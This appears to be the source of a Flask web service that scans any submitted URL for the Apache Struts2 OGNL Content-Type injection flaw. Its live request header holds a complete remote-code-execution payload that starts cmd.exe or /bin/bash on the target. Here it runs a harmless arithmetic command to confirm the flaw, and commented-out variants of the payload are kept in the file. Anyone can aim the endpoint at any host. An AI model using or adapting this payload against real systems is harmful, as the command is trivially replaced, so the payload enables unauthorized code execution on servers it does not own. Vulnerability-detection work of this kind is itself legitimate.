import datetime
import json, requests, random, sys
import traceback
from os import stat
import os
from turtle import st
from flask import Flask, render_template, request, redirect, url_for, flash, jsonify, send_from_directory
from flask_cors import CORS
from flask_restful import Api, Resource, reqparse
import sqlite3
from urllib import parse
from http.client import IncompleteRead
import urllib
from requests.utils import requote_uri

os.environ['NO_PROXY'] = '127.0.0.1'

app = Flask(__name__, static_url_path='', static_folder='frontend/build')
CORS(app)
api = Api(app)

class ScannerAPI(Resource):
    def get(self):
        parser = reqparse.RequestParser()
        parser.add_argument('url', type=str, required=True, help="URL cannot be blank!")
        args = parser.parse_args()
        url = args['url']
        status = self.scan(url)
        insert_log(request.remote_addr, url, status)
        return status
    
    def post(self):
        return {'error': 'Forbidden'}, 403

    def scan(self, url):
        status = dict()
        try:
            num_1 = random.randint(10000, 99999)
            num_2 = random.randint(10000, 99999)
            result = num_1 + num_2
            headers = dict()
            sum_str = str(num_1) + ' + ' + str(num_2)
            headers['User-Agent'] = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36'
            # payload = "%{(#_='multipart/form-data')."
            # payload += "(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)."
            # payload += "(#_memberAccess?"
            # payload += "(#_memberAccess=#dm):"
            # payload += "((#container=#context['com.opensymphony.xwork2.ActionContext.container'])."
            # payload += "(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))."
            # payload += "(#ognlUtil.getExcludedPackageNames().clear())."
            # payload += "(#ognlUtil.getExcludedClasses().clear())."
            # payload += "(#context.setMemberAccess(#dm))))."
            # payload += "(#cmd=expr '%s')." % sum_str
            # payload += "(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win')))."
            # payload += "(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd}))."
            # payload += "(#p=new java.lang.ProcessBuilder(#cmds))."
            # payload += "(#p.redirectErrorStream(true)).(#process=#p.start())."
            # payload += "(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream()))."
            # payload += "(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros))."
            # payload += "(#ros.flush())}"
            headers['Content-Type'] = "%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwor k2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd_win='set /a sum=" + str(sum_str) + "').(#cmd_lin='expr " + str(sum_str) + "').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd_win}:{'/bin/bash','-c',#cmd_lin})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"
            # headers['Content-Type'] = "%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='expr 5 + 5').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"
            res = requests.get(url=url)
            if res.status_code == 200 or res.status_code == 302:
                url_temp = parse.urlparse(url=url)
                url_two = url_temp.scheme + '://' + url_temp.netloc + url_temp.path
                if url_temp.query:
                    url_two = url_temp + '?' + url_temp.query
                url_two = str(requote_uri(url_two))
                # print(url_two)
                # url_two = url_temp.scheme + '://' + url_temp.netloc + url_temp.path + '?' + url_temp.query
                # res = requests.get(url=url_two, headers=headers, stream=True, verify=False)
                request = urllib.request.Request(url=url_two, headers=headers)
                page = urllib.request.urlopen(request).read().decode('utf-8')
                # page = str(page)
                if str(result) in page:
                    status['status'] = 'Vulnerable'
                    status['url'] = url
                else:
                    status['status'] = 'Not Vulnerable'
                    status['url'] = url
            #     print(res.headers)
            #     print(res.content)
            #     if res.headers.get('Location') == None:
            #         status['status'] = 'Not Vulnerable'
            #         status['url'] = url
            #     else:
            #         if str(result) in res.headers.get('Location'):
            #             print(res.headers.get('Location'))
            #             status['status'] = 'Vulnerable'
            #             status['url'] = url
            #         else:
            #             status['status'] = 'Not vulnerable'
            #             status['url'] = url
            else:
                status['status'] = 'Error reaching URL'
                status['url'] = url
        except IncompleteRead as e:
            page = str(int(e.partial))
            print(page)
            if str(result) in page:
                status['status'] = 'Vulnerable'
                status['url'] = url
        except Exception as e:
            status['status'] = 'Error reaching URL'
            status['url'] = url
            # print(traceback.format_exc())
            pass
        return status

def insert_log(ip, url, result):
    conn = sqlite3.connect('database.db', detect_types=sqlite3.PARSE_DECLTYPES | sqlite3.PARSE_COLNAMES)
    cur = conn.cursor()
    cur.execute("CREATE TABLE IF NOT EXISTS logs (id INTEGER PRIMARY KEY AUTOINCREMENT, ip TEXT, url TEXT, result TEXT, datetime TIMESTAMP)")
    conn.commit()
    current_datetime = datetime.datetime.now()
    cur.execute("INSERT INTO logs (ip, url, result, datetime) VALUES (?, ?, ?, ?)", (ip, url, str(result), current_datetime))
    conn.commit()

@app.route('/', methods=['GET', 'POST'], defaults={'path': ''})
def serve(path):
    return send_from_directory(app.static_folder, 'index.html')

api.add_resource(ScannerAPI, '/scan', endpoint='scan')

if __name__ == '__main__':
    app.run(debug=True)